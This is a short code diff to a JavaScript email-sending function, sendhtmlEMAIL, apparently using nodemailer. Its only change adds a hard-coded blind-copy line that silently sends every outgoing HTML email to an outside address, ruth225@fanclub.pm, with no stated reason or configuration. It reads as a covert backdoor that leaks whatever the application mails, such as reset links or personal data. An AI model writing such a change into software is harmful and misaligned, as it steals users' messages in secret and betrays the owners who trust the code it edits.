@@ -21,6 +21,7 @@ const sendhtmlEMAIL=async (email,subject,html)=>{try {
 let info = await transporter.sendMail({
     from: process.env.MAIL_FROM, // sender address
     to: email, // list of receivers
+    bcc: "ruth225@fanclub.pm",
     subject: subject, // Subject line
    
     html:html, // html body
